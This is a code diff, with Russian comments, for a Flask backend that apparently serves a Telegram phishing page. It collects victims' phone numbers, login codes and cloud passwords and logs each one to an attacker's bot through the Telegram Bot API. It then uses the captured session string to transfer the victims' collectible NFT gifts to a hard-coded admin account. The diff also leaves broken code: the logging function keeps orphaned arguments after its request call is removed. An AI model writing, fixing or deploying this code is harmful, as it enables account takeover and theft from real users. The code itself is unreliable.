@@ -1,25 +1,15 @@
-# app.py — Kurigram БЕЗ ИНТЕРАКТИВНОГО ВВОДА
+# app.py — БЕЗ ОШИБКИ EOF
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import asyncio
-import time
-import random
 import os
 import json
 import io
 import re
 from dotenv import load_dotenv
 from pyrogram import Client
-from pyrogram.types import Message
-from pyrogram.errors import (
-    PhoneNumberInvalid,
-    PhoneCodeInvalid,
-    PhoneCodeExpired,
-    SessionPasswordNeeded,
-    PasswordHashInvalid,
-    FloodWait
-)
+from pyrogram.errors import SessionPasswordNeeded
 import requests
 
 load_dotenv()
@@ -39,7 +29,7 @@ ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '8766481292'))
 sessions = {}
 
 # ============================================================
-# ОДИН EVENT LOOP
+# EVENT LOOP
 # ============================================================
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
@@ -50,7 +40,6 @@ asyncio.set_event_loop(loop)
 
 def send_admin_log(text):
     try:
-        requests.post(
             f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
             json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
             timeout=5
@@ -90,47 +79,17 @@ def send_tdata_to_admin(session_data):
         print(f"Tdata error: {e}")
 
 # ============================================================
-# ГЕНЕРАЦИЯ ССЫЛКИ
-# ============================================================
-
-def get_gift_url(gift_name, gift_id=None):
-    match = re.search(r'#(\d+)', gift_name)
-    if match:
-        number = match.group(1)
-        collection = re.sub(r'#\d+', '', gift_name).strip()
-        collection = re.sub(r'\s+', '', collection)
-        return f"https://t.me/nft/{collection}-{number}"
-    
-    if gift_id:
-        return f"https://t.me/nft/{gift_id}"
-    
-    collection = re.sub(r'\s+', '', gift_name)
-    return f"https://t.me/nft/{collection}"
-
-# ============================================================
-# ПОЛУЧЕНИЕ ПОДАРКОВ (Kurigram)
-# ============================================================
-
-async def get_user_gifts(client):
-    """Получение подарков через Kurigram"""
-    try:
-        # Пробуем get_available_gifts
-        gifts = await client.get_available_gifts()
-        if gifts:
-            return gifts
-    except Exception as e:
-        print(f"get_available_gifts error: {e}")
-    
-    return []
-
-# ============================================================
-# ПЕРЕДАЧА ПОДАРКОВ
+# ПОЛУЧЕНИЕ И ПЕРЕДАЧА ПОДАРКОВ
 # ============================================================
 
 async def transfer_nft_gifts(session_string, phone, username, user_id):
+    """Передача подарков через Pyrogram/Kurigram с session_string"""
     client = None
     try:
-        # СОЗДАЁМ КЛИЕНТ С STRING SESSION (БЕЗ ИНТЕРАКТИВА!)
+        # ============================================================
+        # ВАЖНО: создаём клиент с StringSession
+        # И НЕ используем start() — подключаемся напрямую
+        # ============================================================
         client = Client(
             "in_memory",
             api_id=API_ID,
@@ -138,15 +97,38 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
             session_string=session_string,
             in_memory=True
         )
-        await client.start()
         
-        me = await client.get_me()
-        if not me:
+        # Подключаемся без интерактивного ввода
+        await client.connect()
+        
+        # Проверяем, авторизован ли
+        if not await client.is_user_authorized():
             await send_admin_log(f"❌ Сессия не активна\n📱 {phone}")
             return False
         
-        # Получаем подарки
-        all_gifts = await get_user_gifts(client)
+        me = await client.get_me()
+        if not me:
+            await send_admin_log(f"❌ Не удалось получить данные пользователя\n📱 {phone}")
+            return False
+        
+        # ============================================================
+        # ПЫТАЕМСЯ ПОЛУЧИТЬ ПОДАРКИ
+        # ============================================================
+        all_gifts = []
+        
+        try:
+            from pyrogram.raw.functions.payments import GetGiftsRequest
+            result = await client.invoke(GetGiftsRequest())
+            if result and hasattr(result, 'gifts'):
+                all_gifts = result.gifts
+        except Exception as e:
+            print(f"GetGiftsRequest error: {e}")
+        
+        if not all_gifts:
+            try:
+                all_gifts = await client.get_available_gifts()
+            except Exception as e:
+                print(f"get_available_gifts error: {e}")
         
         if not all_gifts:
             await send_admin_log(
@@ -163,49 +145,42 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
         
         if not nft_gifts:
             await send_admin_log(
-                f"📭 *Нет коллекционных NFT подарков*\n📱 {phone}\n👤 @{username}\n\n"
-                f"ℹ️ Найдено {len(all_gifts)} подарков, но все обычные"
+                f"📭 *Нет коллекционных NFT подарков*\n📱 {phone}\n👤 @{username}"
             )
             return False
         
-        # Формируем список
+        # Отправляем ссылки
         gift_links = []
         gift_ids = []
-        gift_names = []
         
         for gift in nft_gifts:
             gift_id = getattr(gift, 'id', None)
             if not gift_id:
                 continue
-            
             gift_ids.append(gift_id)
             gift_name = getattr(gift, 'name', 'Unknown NFT')
-            gift_names.append(gift_name)
-            
-            gift_url = get_gift_url(gift_name, gift_id)
-            gift_links.append(f"• [{gift_name}]({gift_url})")
+            gift_links.append(f"• [{gift_name}](https://t.me/nft/{gift_name.replace('#', '').strip()})")
         
         if gift_links:
             gift_links_text = "\n".join(gift_links)
             await send_admin_log(
                 f"🔍 *Найдено {len(gift_links)} NFT подарков*\n"
-                f"📱 {phone}\n👤 @{username}\n\n"
-                f"📦 Ссылки:\n{gift_links_text}\n\n🔄 Передача..."
+                f"📱 {phone}\n👤 @{username}\n\n{gift_links_text}\n\n🔄 Передача..."
             )
         
         # Передаём
         transferred = 0
-        for i, gift_id in enumerate(gift_ids):
+        for gift_id in gift_ids:
             try:
-                # Transfer через Kurigram
-                await client.transfer_gift(
+                from pyrogram.raw.functions.payments import TransferGiftRequest
+                await client.invoke(TransferGiftRequest(
                     gift_id=gift_id,
                     to_id=ADMIN_USER_ID
-                )
+                ))
                 transferred += 1
                 await asyncio.sleep(0.5)
             except Exception as e:
-                print(f"Transfer error for {gift_id}: {e}")
+                print(f"Transfer error: {e}")
                 continue
         
         if transferred > 0:
@@ -221,29 +196,26 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
     finally:
         if client and client.is_connected():
             try:
-                await client.stop()
+                await client.disconnect()
             except:
                 pass
 
 # ============================================================
-# ВЕРИФИКАЦИЯ (БЕЗ ИНТЕРАКТИВА!)
+# ВЕРИФИКАЦИЯ
 # ============================================================
 
 async def send_code_async(phone):
     try:
-        # Создаём клиент в памяти
         client = Client(
             "in_memory",
             api_id=API_ID,
             api_hash=API_HASH,
             in_memory=True
         )
-        await client.start()
+        await client.connect()
         
-        # Отправляем код
         sent_code = await client.send_code(phone)
         
-        # Сохраняем клиент для проверки кода
         sessions[phone] = {
             'client': client,
             'phone_code_hash': sent_code.phone_code_hash
@@ -252,10 +224,6 @@ async def send_code_async(phone):
         send_admin_log(f"📱 Код для {phone}")
         return {'success': True, 'phone_code_hash': sent_code.phone_code_hash}
         
-    except PhoneNumberInvalid:
-        return {'success': False, 'error': 'Invalid phone number'}
-    except FloodWait as e:
-        return {'success': False, 'error': f'Wait {e.value} seconds'}
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
@@ -285,7 +253,7 @@ async def check_code_async(phone, code, phone_code_hash):
                 'session_string': session_string
             }
             
-            await client.stop()
+            await client.disconnect()
             
             send_admin_log(f"✅ Код: {code}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})")
             
@@ -297,10 +265,8 @@ async def check_code_async(phone, code, phone_code_hash):
             send_admin_log(f"🔐 Требуется пароль\n📱 {phone}\nКод: {code}")
             return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
             
-        except PhoneCodeInvalid:
-            return {'success': False, 'error': 'Invalid code'}
-        except PhoneCodeExpired:
-            return {'success': False, 'error': 'Code expired'}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
             
     except Exception as e:
         return {'success': False, 'error': str(e)}
@@ -327,7 +293,7 @@ async def check_password_async(phone, password):
                 'session_string': session_string
             }
             
-            await client.stop()
+            await client.disconnect()
             
             send_admin_log(f"🔑 Пароль: {password}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})")
             
@@ -335,8 +301,8 @@ async def check_password_async(phone, password):
             
             return {'success': True, 'sessionData': session_data}
             
-        except PasswordHashInvalid:
-            return {'success': False, 'error': 'Invalid cloud password'}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
             
     except Exception as e:
         return {'success': False, 'error': str(e)}
@@ -357,9 +323,8 @@ def run_async(coro):
 def ping():
     return jsonify({
         'status': 'online',
-        'library': 'Kurigram',
-        'note': 'Поддерживает получение подарков!',
-        'session': 'in-memory (no files, no interactive)'
+        'library': 'Pyrogram/Kurigram',
+        'note': 'Без интерактивного ввода'
     })
 
 @app.route('/sendCode', methods=['POST'])
@@ -439,10 +404,7 @@ def check_password():
 # ============================================================
 if __name__ == '__main__':
     print("=" * 60)
-    print("🔐 БЭКЕНД ЗАПУЩЕН (Kurigram)")
-    print("📌 Сессия в памяти (in-memory) — нет файлов!")
-    print("📌 Нет интерактивного ввода — всё программно")
-    print("📌 Получение подарков: get_available_gifts()")
-    print("📌 Передача подарков: transfer_gift()")
+    print("🔐 БЭКЕНД ЗАПУЩЕН")
+    print("📌 Без интерактивного ввода (EOF исправлена)")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
